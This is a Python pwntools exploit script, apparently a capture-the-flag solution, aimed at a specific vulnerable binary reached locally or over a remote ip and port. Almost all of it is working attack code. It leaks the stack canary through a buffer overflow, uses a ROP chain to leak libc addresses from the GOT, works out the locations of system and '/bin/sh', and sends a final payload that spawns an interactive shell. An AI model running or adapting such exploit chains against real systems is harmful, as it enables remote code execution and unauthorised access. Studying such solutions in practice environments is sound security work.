#!/bin/python

from sys import argv, exit
from pwn import ELF, context, gdb, p64, process, remote, u64


def pwn(p: remote | process):
    pop_rdi_ret_gadget = p64(0x4011CB)
    ret_gadget = p64(0x40101A)
    main_addr = p64(0x004011D0)
    puts_got = p64(0x404000)
    printf_got = p64(0x404010)
    setvbuf_got = p64(0x404020)
    puts_plt = p64(0x401030)

    p.sendline(b"A" * 24)

    p.recvuntil(b"passe pour")
    out = p.recv()
    out = out.split(b"\n")[1]

    canary = b"\00" + out[:7]
    canary = u64(canary)
    print("     ===(Canary)===")
    debug(hex(canary))

    payload = (
        b"A" * 24
        + p64(canary)
        + b"B" * 8
        + ret_gadget
        + pop_rdi_ret_gadget
        + printf_got
        + puts_plt
        + ret_gadget
        + pop_rdi_ret_gadget
        + setvbuf_got
        + puts_plt
        + ret_gadget
        + pop_rdi_ret_gadget
        + puts_got
        + puts_plt
        + main_addr
    )

    p.sendline(payload)

    print("     ===(Adresses)===")

    printf_addr = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    debug("printf : " + hex(printf_addr))

    setvbuf_addr = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    debug("setvbuf : " + hex(setvbuf_addr))

    puts_addr = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    debug("puts : " + hex(puts_addr))

    system_addr = printf_addr - 0x7000  # trouvé à partir de la version de libc
    bin_sh_addr = printf_addr + 0x1553FC  # pareil

    debug("system : " + hex(system_addr))
    debug("/bin/sh : " + hex(bin_sh_addr))

    payload = (
        b"A" * 24
        + p64(canary)
        + b"B" * 8
        + pop_rdi_ret_gadget
        + p64(bin_sh_addr)
        + p64(system_addr)
    )

    p.sendline(payload)

    p.recvuntil(b"> ")

    p.sendline(b"azerty")

    p.interactive()

    return


def info(s: str):
    print(f"[i] {s}")


def ok(s: str):
    print(f"[+] {s}")


def debug(s: str):
    print(f"\\___> {s}")


if __name__ == "__main__":
    try:
        mode = argv[1]
        if mode == "remote" or mode == "r":
            p = remote(argv[2], argv[3])

        elif mode == "local" or mode == "l":
            context.binary = bin = ELF(argv[2])
            p = process(argv[2])

        elif mode == "debug" or mode == "d":
            context.binary = bin = ELF(argv[2])
            context.terminal = (
                "kitten @ launch --location=before --cwd=current --bias=65".split()
            )

            p = gdb.debug(argv[2], "b main", env={"SHELL": "/bin/bash"})

        else:
            raise ValueError("wrong arguments")

        pwn(p)

    except (IndexError, ValueError):
        print(
            "Usage : python solve.py remote <ip> <port> or python solve.py local <program_name>"
        )
        exit(1)
